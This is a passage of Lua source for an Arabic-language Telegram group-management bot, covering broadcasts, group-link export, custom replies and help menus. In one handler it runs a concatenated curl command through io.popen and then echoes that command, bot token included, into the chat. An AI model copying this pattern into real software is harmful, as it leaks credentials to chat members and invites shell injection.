tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
SendText(DevId,"⌁︙هناك من بحاجه الى مساعده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الشخص ↫ "..Name.."\n⌁︙اسم المجموعه ↫ ["..NameChat.."]\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n⌁︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").."\n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end,nil)
end,nil)
end
--     Source DevFeras     --
if text == 'نسخه ملف السورس' then
if not Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
sendDocument(DevId, 0, 0, 1, nil, './DevFeras.lua', dl_cb, nil)
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙عزيزي المطور تم ارسال نسخة ملف السورس الى الخاص', 1, 'md')
end end
--     Source DevFeras     --
if text == 'روابط القروبات' or text == 'روابط المجموعات' then
if not Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
local groups = function(extra, result) 
local num = (DevFeras:scard(DevFeras.."bot:groups"))
local list = DevFeras:smembers(DevFeras.."bot:groups")
local text = "⌁︙Source DevFeras\n⌁︙File Bot Groups\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local GroupsOwners = DevFeras:scard(DevFeras.."abs:owners:"..v) or 0
local GroupsAdmins = DevFeras:scard(DevFeras.."abs:admins:"..v) or 0
local Groupslink = DevFeras:get(DevFeras.."bot:group:link" ..v)
text = text..k.." ↬ ⤈ \n⌁︙Group ID ↬ "..v.."\n⌁︙Group Link ↬ "..(Groupslink or "Not Found").."\n⌁︙Group Owners ↬ "..GroupsOwners.."\n⌁︙Group Admins ↬ "..GroupsAdmins.."\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
end
local file = io.open('GroupsBot.txt', 'w')
file:write(text)
file:close()
local abbss = 'https://api.telegram.org/bot' .. TokenBot .. '/sendDocument'
local abbsss = 'curl "' .. abbss .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'GroupsBot.txt' .. '"'
io.popen(abbsss)
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙جاري ارسال نسخه تحتوي على '..num..' مجموعه', 1, 'md')
sleep(1.5)
Dev_Feras(msg.chat_id_, msg.id_, 1, abbsss, 1, 'md')
end
getUser(msg.sender_user_id_, groups)
end
end
--     Source DevFeras     --
if text == "اذاعه بالخاص" and msg.reply_to_message_id_ == 0 and Sudo(msg) or text == "↫ اذاعه خاص ⌁" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
DevFeras:setex(DevFeras.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙ارسل لي سواء ↫ ⤈ \n❨ ملصق • متحركه • صوره • رساله ❩ \n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
return false
end 
if DevFeras:get(DevFeras.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevFeras:del(DevFeras.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
list = DevFeras:smembers(DevFeras..'bot:userss') 
if msg.content_.text_ then
for k,v in pairs(list) do 
Dev_Feras(v, 0, 1, '['..msg.content_.text_..']', 1, 'md')
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة رسالتك بنجاح \n⌁︙‏الى ↫ ❨ "..#list.." ❩ مشترك \n ✓", 1, 'md')
DevFeras:del(DevFeras.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     Source DevFeras     --
if text == "اذاعه" and msg.reply_to_message_id_ == 0 and Sudo(msg) or text == "↫ اذاعه عام ⌁" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
DevFeras:setex(DevFeras.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙ارسل لي سواء ↫ ⤈ \n❨ ملصق • متحركه • صوره • رساله ❩ \n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
return false
end 
if DevFeras:get(DevFeras.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevFeras:del(DevFeras.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
list = DevFeras:smembers(DevFeras..'bot:groups') 
if msg.content_.text_ then
for k,v in pairs(list) do 
Dev_Feras(v, 0, 1, '['..msg.content_.text_..']', 1, 'md')
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة رسالتك بنجاح \n⌁︙‏في ↫ ❨ "..#list.." ❩ مجموعه \n ✓", 1, 'md')
DevFeras:del(DevFeras.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     Source DevFeras     --
if text == "اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0 and Sudo(msg) or text == "↫ اذاعه عام بالتوجيه ⌁" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
DevFeras:setex(DevFeras.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙ارسل الرساله الان لتوجيها \n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
return false
end 
if DevFeras:get(DevFeras.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevFeras:del(DevFeras.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
local list = DevFeras:smembers(DevFeras..'bot:groups')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة رسالتك بالتوجيه \n⌁︙‏في ↫ ❨ "..#list.." ❩ مجموعه \n ✓", 1, 'md')
DevFeras:del(DevFeras.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     Source DevFeras     --
if text == "اذاعه خاص بالتوجيه" and msg.reply_to_message_id_ == 0 and Sudo(msg) or text == "↫ اذاعه خاص بالتوجيه ⌁" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
DevFeras:setex(DevFeras.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙ارسل الرساله الان لتوجيها \n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
return false
end 
if DevFeras:get(DevFeras.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevFeras:del(DevFeras.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
local list = DevFeras:smembers(DevFeras..'bot:userss')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة رسالتك بالتوجيه \n⌁︙‏الى ↫ ❨ "..#list.." ❩ مشترك \n ✓", 1, 'md')
DevFeras:del(DevFeras.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     Source DevFeras     --
if text == "اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and Sudo(msg) or text == "↫ اذاعه بالتثبيت ⌁" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
DevFeras:setex(DevFeras.."Send:Gp:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙ارسل لي سواء ↫ ⤈ \n❨ ملصق • متحركه • صوره • رساله ❩ \n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
return false
end 
if DevFeras:get(DevFeras.."Send:Gp:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" then   
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevFeras:del(DevFeras.."Send:Gp:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = DevFeras:smembers(DevFeras.."bot:groups") 
if msg.content_.text_ then
for k,v in pairs(list) do 
Dev_Feras(v, 0, 1, '['..msg.content_.text_..']', 1, 'md')
DevFeras:set(DevFeras..'pinnedmsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
DevFeras:set(DevFeras..'pinnedmsgs'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
DevFeras:set(DevFeras..'pinnedmsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
DevFeras:set(DevFeras..'pinnedmsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة رسالتك بالتثبيت \n⌁︙‏في ↫ ❨ "..#list.." ❩ مجموعه \n ✓", 1, 'md')
DevFeras:del(DevFeras.."Send:Gp:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
--     Source DevFeras     --
text = msg.content_.text_
if msg.content_.text_ == 'حذف رد' and Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) or msg.content_.text_ == 'مسح رد' and  Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
DevFeras:set(DevFeras..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','del_repgp1')
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
if msg.content_.text_ == 'اضف رد' and Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
DevFeras:set(DevFeras..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','set_repgp')
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه الان " ,  1, "md")
return false    end
if msg.content_.text_ then
local content_DevFeras2 = DevFeras:get(DevFeras..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_DevFeras2 == 'set_repgp' then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙ يمكنك اضافه الى النص ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevFeras:set(DevFeras..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','save_repgp')
DevFeras:set(DevFeras..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'',msg.content_.text_)
DevFeras:sadd(DevFeras..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
DevFeras:set(DevFeras..'delrep_owner'..msg.chat_id_..'',msg.content_.text_)
return false
end
end
--     Source DevFeras     --
text = msg.content_.text_
if msg.content_.text_ == 'حذف رد عام' and Sudo(msg) or msg.content_.text_ == '↫ حذف رد عام ⌁' and Sudo(msg) or msg.content_.text_ == 'مسح رد عام' and Sudo(msg) then
DevFeras:set(DevFeras.."add:repallt"..msg.sender_user_id_,'del_rep1')
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
if msg.content_.text_ == 'اضف رد عام' and Sudo(msg) or msg.content_.text_ == '↫ اضف رد عام ⌁' and Sudo(msg) then
DevFeras:set(DevFeras.."add:repallt"..msg.sender_user_id_,'set_rep')
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه الان " ,  1, "md")
return false    end
if msg.content_.text_ then
local content_DevFeras2 = DevFeras:get(DevFeras.."add:repallt"..msg.sender_user_id_)
if content_DevFeras2 == 'set_rep' then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙ يمكنك اضافه الى النص ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevFeras:set(DevFeras.."add:repallt"..msg.sender_user_id_,'save_rep')
DevFeras:set(DevFeras.."addreply2:"..msg.sender_user_id_, msg.content_.text_)
DevFeras:sadd(DevFeras.."rep_sudo",msg.content_.text_)
DevFeras:set(DevFeras.."delrep_sudo",msg.content_.text_)
return false 
end end
--     Source DevFeras     --
if msg.content_.text_ == 'الردود' and Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) or msg.content_.text_ == 'ردود المدير' and Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local redod = DevFeras:smembers(DevFeras..'rep_owner'..msg.chat_id_..'')
if #redod == 0 then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود مضافه" ,  1, "md")
else
msg_rep = '⌁︙ردود المدير ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
for k,v in pairs(redod) do
if DevFeras:get(DevFeras.."gif_repgp"..v..msg.chat_id_) then
dp = 'متحركه 🎭'
elseif DevFeras:get(DevFeras.."voice_repgp"..v..msg.chat_id_) then
dp = 'بصمه 🎙'
elseif DevFeras:get(DevFeras.."stecker_repgp"..v..msg.chat_id_) then
dp = 'ملصق 🃏'
elseif DevFeras:get(DevFeras.."text_repgp"..v..msg.chat_id_) then
dp = 'رساله ✉'
elseif DevFeras:get(DevFeras.."photo_repgp"..v..msg.chat_id_) then
dp = 'صوره 🎇'
elseif DevFeras:get(DevFeras.."video_repgp"..v..msg.chat_id_) then
dp = 'فيديو 📽'
elseif DevFeras:get(DevFeras.."file_repgp"..v..msg.chat_id_) then
dp = 'ملف 📁'
elseif DevFeras:get(DevFeras.."audio_repgp"..v..msg.chat_id_) then
dp = 'اغنيه 🎶'
end
msg_rep = msg_rep ..k..'~ (*'..v..'*) ↫ {*'..dp..'*}\n' 
end
Dev_Feras(msg.chat_id_, msg.id_, 1, msg_rep,1, 'md')
end
return false
end
--     Source DevFeras     --
if msg.content_.text_ == 'حذف الردود' and Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) or msg.content_.text_ == 'مسح الردود' and Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) or msg.content_.text_ == 'حذف ردود المدير' and Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) or msg.content_.text_ == 'مسح ردود المدير' and Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local redod = DevFeras:smembers(DevFeras..'rep_owner'..msg.chat_id_..'')
if #redod == 0 then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevFeras:del(DevFeras..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
DevFeras:del(DevFeras..'gif_repgp'..v..msg.chat_id_)
DevFeras:del(DevFeras..'voice_repgp'..v..msg.chat_id_)
DevFeras:del(DevFeras..'audio_repgp'..v..msg.chat_id_)
DevFeras:del(DevFeras..'photo_repgp'..v..msg.chat_id_)
DevFeras:del(DevFeras..'stecker_repgp'..v..msg.chat_id_)
DevFeras:del(DevFeras..'video_repgp'..v..msg.chat_id_)
DevFeras:del(DevFeras..'file_repgp'..v..msg.chat_id_)
DevFeras:del(DevFeras..'text_repgp'..v..msg.chat_id_)
DevFeras:del(DevFeras..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
end
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف ردود المدير\n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
return false
end
end
--     Source DevFeras     --
if  msg.content_.text_ == "ردود المطور" and Sudo(msg) or msg.content_.text_ == "الردود العام" and Sudo(msg) or msg.content_.text_ == "ردود العام" and Sudo(msg) or msg.content_.text_ == "↫ الردود العام ⌁" and Sudo(msg) then
local redod = DevFeras:smembers(DevFeras.."rep_sudo")
if #redod == 0 then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود مضافه" ,  1, "md")
else
local i = 1
msg_rep = '⌁︙ردود المطور ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
for k,v in pairs(redod) do
if DevFeras:get(DevFeras.."gif_repall"..v) then
dp = 'متحركه 🎭'
elseif DevFeras:get(DevFeras.."voice_repall"..v) then
dp = 'بصمه 🎙'
elseif DevFeras:get(DevFeras.."stecker_repall"..v) then
dp = 'ملصق 🃏'
elseif DevFeras:get(DevFeras.."text_repall"..v) then
dp = 'رساله ✉'
elseif DevFeras:get(DevFeras.."photo_repall"..v) then
dp = 'صوره 🎇'
elseif DevFeras:get(DevFeras.."video_repall"..v) then
dp = 'فيديو 📽'
elseif DevFeras:get(DevFeras.."file_repall"..v) then
dp = 'ملف 📁'
elseif DevFeras:get(DevFeras.."audio_repall"..v) then
dp = 'اغنيه 🎶'
end
msg_rep = msg_rep ..k..'~ (*'..v..'*) ↫ {*'..dp..'*}\n' 
end
Dev_Feras(msg.chat_id_, msg.id_, 1, msg_rep,1, "md")
end
return false
end
--     Source DevFeras     --
if msg.content_.text_ == "حذف ردود المطور" and Sudo(msg) or msg.content_.text_ == "حذف ردود العام" and Sudo(msg) or msg.content_.text_ == "مسح ردود المطور" and Sudo(msg) then
local redod = DevFeras:smembers(DevFeras.."rep_sudo")
if #redod == 0 then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevFeras:del(DevFeras.."add:repallt"..v)
DevFeras:del(DevFeras.."gif_repall"..v)
DevFeras:del(DevFeras.."voice_repall"..v)
DevFeras:del(DevFeras.."audio_repall"..v)
DevFeras:del(DevFeras.."photo_repall"..v)
DevFeras:del(DevFeras.."stecker_repall"..v)
DevFeras:del(DevFeras.."video_repall"..v)
DevFeras:del(DevFeras.."file_repall"..v)
DevFeras:del(DevFeras.."text_repall"..v)
DevFeras:del(DevFeras.."rep_sudo",msg.content_.text_)
end
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف ردود المطور \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
return false
end
end 
--     Source DevFeras     --
if Admin(msg.sender_user_id_, msg.chat_id_) then
if text and text == "تغيير اسم البوت" or text and text == "وضع اسم البوت" or text and text == "تغير اسم البوت" then
if not Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙ارسل اسم البوت الان \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set('Feras_dev:'..bot_id..'namebot'..msg.sender_user_id_..'', 'msg')
return false 
end
end
if text and text == 'حذف اسم البوت' or text == 'مسح اسم البوت' then
if not Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
DevFeras:del('Feras_dev:'..bot_id..'name_bot')
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف اسم البوت \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end end 
--     Source DevFeras     --
if text and text:match("^استعاده الاوامر$") and Sudo(msg) or text and text:match("^استعادة كلايش الاوامر$") and Sudo(msg) then
DevFeras:del(DevFeras..'bot:help', text)
DevFeras:del(DevFeras..'bot:help1', text)
DevFeras:del(DevFeras..'bot:help2', text)
DevFeras:del(DevFeras..'bot:help3', text) 
DevFeras:del(DevFeras..'bot:help4', text)
DevFeras:del(DevFeras..'bot:help5', text) 
DevFeras:del(DevFeras..'bot:help6', text) 
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم استعادة الكلايش الاصليه" ,  1, "md") 
end
if text and text:match("^تعيين الاوامر$") and Sudo(msg) or text and text:match("^تعيين امر الاوامر$") and Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (الاوامر) الان " ,  1, "md")
DevFeras:set(DevFeras..'bot:help0'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local Feras_dev =  DevFeras:get(DevFeras..'bot:help0'..msg.sender_user_id_..'')
if Feras_dev == 'msg' then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده " ,  1, "md")
DevFeras:set(DevFeras..'bot:help0'..msg.sender_user_id_..'', 'no')
DevFeras:set(DevFeras..'bot:help', text)
Dev_Feras(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^الاوامر$") or text and text:match("^اوامر$") or text and text:match("^مساعده$") then
local help = DevFeras:get(DevFeras..'bot:help')
local text =  [[
⌁︙اهلا بك في قائمة الاوامر ↫ ⤈ 
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙م1 ↫ اوامر الحمايه
⌁︙م2 ↫ اوامر الادمنيه
⌁︙م3 ↫ اوامر المدراء
⌁︙م4 ↫ اوامر المنشئين
⌁︙م5 ↫ اوامر المطورين
⌁︙م6 ↫ اوامر الاعضاء
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://T.ME/DevFeras)
]] 
Dev_Feras(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if text and text:match("^تعيين امر م1$") and Sudo(msg) or text and text:match("^تعيين امر م١$") and Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م1) الان " ,  1, "md")
DevFeras:set(DevFeras..'bot:help01'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local Feras_dev =  DevFeras:get(DevFeras..'bot:help01'..msg.sender_user_id_..'')
if Feras_dev == 'msg' then 
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده " ,  1, "md")
DevFeras:set(DevFeras..'bot:help01'..msg.sender_user_id_..'', 'no')
DevFeras:set(DevFeras..'bot:help1', text)
Dev_Feras(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م1$") or text and text:match("^م١$") or text and text:match("^اوامر1$") or text and text:match("^اوامر١$") then
local help = DevFeras:get(DevFeras..'bot:help1')
local text =  [[
⌁︙اوامر حماية المجموعه ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙قفل • فتح ↫ الروابط
⌁︙قفل • فتح ↫ المعرف
⌁︙قفل • فتح ↫ البوتات
⌁︙قفل • فتح ↫ المتحركه
⌁︙قفل • فتح ↫ الملصقات
⌁︙قفل • فتح ↫ الملفات
⌁︙قفل • فتح ↫ الصور
⌁︙قفل • فتح ↫ الفيديو
⌁︙قفل • فتح ↫ الاونلاين
⌁︙قفل • فتح ↫ الدردشه
⌁︙قفل • فتح ↫ التوجيه
⌁︙قفل • فتح ↫ الاغاني
⌁︙قفل • فتح ↫ الصوت
⌁︙قفل • فتح ↫ الجهات
⌁︙قفل • فتح ↫ الماركداون
⌁︙قفل • فتح ↫ التكرار
⌁︙قفل • فتح ↫ الهاشتاك
⌁︙قفل • فتح ↫ التعديل
⌁︙قفل • فتح ↫ التثبيت
⌁︙قفل • فتح ↫ الاشعارات
⌁︙قفل • فتح ↫ الكلايش
⌁︙قفل • فتح ↫ الدخول
⌁︙قفل • فتح ↫ الشبكات
⌁︙قفل • فتح ↫ المواقع
⌁︙قفل • فتح ↫ الفشار
⌁︙قفل • فتح ↫ الكفر
⌁︙قفل • فتح ↫ الطائفيه
⌁︙قفل • فتح ↫ الكل
